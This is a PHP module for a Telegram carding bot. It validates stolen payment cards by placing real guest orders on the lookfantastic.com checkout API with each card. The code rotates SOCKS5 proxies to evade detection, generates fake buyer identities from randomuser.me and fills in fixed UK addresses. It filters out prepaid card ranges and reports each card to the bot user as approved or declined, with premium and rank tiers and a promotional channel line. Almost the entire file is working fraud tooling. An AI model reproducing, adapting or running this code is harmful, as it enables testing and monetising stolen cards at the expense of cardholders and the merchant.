<?php

list($cmd) = explode(" ", $message);
if($cmd == "/hg" or $cmd == ".hg" or $cmd == "!hg"){
 $tiempo_inicial = microtime(true);
$NameGater ='Holger';
$gateway = "/hg $NameGater";
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Stripe</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!hg card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();


#------[CURL-2]------#
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS! 🟨</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


//////////////////////////////=================[Join @TechHacksBySoham For More Stuff]=================/////////////////////////
date_default_timezone_set('America/Bogota'); 
$curl = new CurlX;
$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . rand(11,999999999) . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = "725".rand(1111111,9999999);
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];

//user
//cookies
$cookie = uniqid();
//Proxies
$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];


$req = $curl::Get("https://www.lookfantastic.com/basketinterface.json?productId=13735070&siteId=95&siteDefaultLocale=en_GB&siteSubsiteCode=en&variationLength=0&quantity=1&fromWishlist=false", $headers = null , $cookie,$server);

$req = $curl::Get("https://www.lookfantastic.com/my.basket", $headers = null , $cookie,$server);


$req = $curl::Post('https://www.lookfantastic.com/checkoutStart.account',$data = null, $headers = ["Content-Type: application/x-www-form-urlencoded"] , $cookie,$server);

$req = $curl::Post('https://www.lookfantastic.com/account/guestCheckoutStart.account',$data = '{"email":"","newsletterStatus":"false","returnTo":"https%3A%2F%2Fwww.lookfantastic.com%2FcheckoutStart.account"}', $headers = ["Content-Type: application/json"] , $cookie,$server);
$data = json_decode($req->body, true);
$urlRedirect = $data["urlRedirect"];

$req = $curl::Get($urlRedirect, $headers = null , $cookie,$server);


$headers = array();
$headers[] = 'Host: checkout.lookfantastic.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json; charset=utf-8';
$headers[] = 'Sessionid: -1';
$headers[] = 'X-Thg-Client: checkout-web-js';
$headers[] = 'Origin: https://checkout.lookfantastic.com';
$headers[] = 'Dnt: 1';
$headers[] = 'Sec-Gpc: 1';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Te: trailers';
$headers[] = 'Connection: close';

$req = $curl::Post('https://checkout.lookfantastic.com/checkout-api/v2/delivery',$data = '{"country":"GB","postCode":"NG1 9PG","state":"","townCity":""}', $headers , $cookie,$server);

print_r($req->body);

$headers = array();
$headers[] = 'Host: checkout.lookfantastic.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json; charset=utf-8';
$headers[] = 'Sessionid: -1';
$headers[] = 'X-Thg-Client: checkout-web-js';
$headers[] = 'Origin: https://checkout.lookfantastic.com';
$headers[] = 'Dnt: 1';
$headers[] = 'Sec-Gpc: 1';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Te: trailers';
$headers[] = 'Connection: close';


$req = $curl::Post('https://checkout.lookfantastic.com/checkout-api/v2/order/place-order',$data = '{"fullName":"'.$firstname.'","payerName":"","contactNumber":"2758372938","deliveryAddress":{"addressType":"postal","addressee":"'.$firstname.'","organisationName":"Plymouth","buildingNameNumber":"32","line1":"5 Elliot St","line2":"","line3":"Nottingham","line4":"Nottingham","postcode":"NG1 9PG","countryCode":"GB"},"emailAddress":"'.$email.'","optedIntoMarketing":false,"payment":{"creditCardNumber":"'.$cc.'","nameOnCard":"'.$firstname.' '.$lastname.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cv2":"'.$cvv.'","method":"new-credit-card","billingAddress":{"addressType":"postal","addressee":"'.$firstname.'","organisationName":"Plymouth","buildingNameNumber":"32","line1":"5 Elliot St","line2":"","line3":"Nottingham","line4":"Nottingham","postcode":"NG1 9PG","countryCode":"GB"},"consentToReuse":null},"deliverySelection":{"groupSelections":[{"groupId":0,"deliveryOptionType":18,"subDeliveryOptionIndex":null,"used":true}],"deliveryOptionsRequest":{"country":"GB","postCode":"NG1 9PG","state":"","townCity":""}},"reCaptchaToken":"","giftCards":[],"deviceInformation":{"deviceId":"9fb75826d9cfa5462589641ed45df8c4","screenResolution":{"width":1366,"height":768,"ratio":1},"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0","timezone":"America/Botoga","language":"es-CL","acceptHeader":"application/json","colorDepth":24,"timeZoneOffset":300,"javaEnabled":false}}', $headers , $cookie,$server);

$headers = array();
$headers[] = 'Host: checkout.lookfantastic.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'Content-Type: application/json';
$headers[] = 'sessionId: -1';
$headers[] = 'x-thg-client: checkout-web-js';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';


$req = $curl::Get("https://checkout.lookfantastic.com/checkout-api/v2/order/status", $headers , $cookie,$server);
$data = json_decode($req->body, true);
$message = $data["orderStatus"];
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}


bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if($message == ""){ 
$status = "Approved! ✅";
$response = "Approved! ✅";
}elseif(strpos($result2, "TRANSACTION_LIMIT")){ 
$status = "Approved CVV ✅!";
$response = $message;
}else{
$status = "DECLINED ❌";
$response = $message;
}

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

?>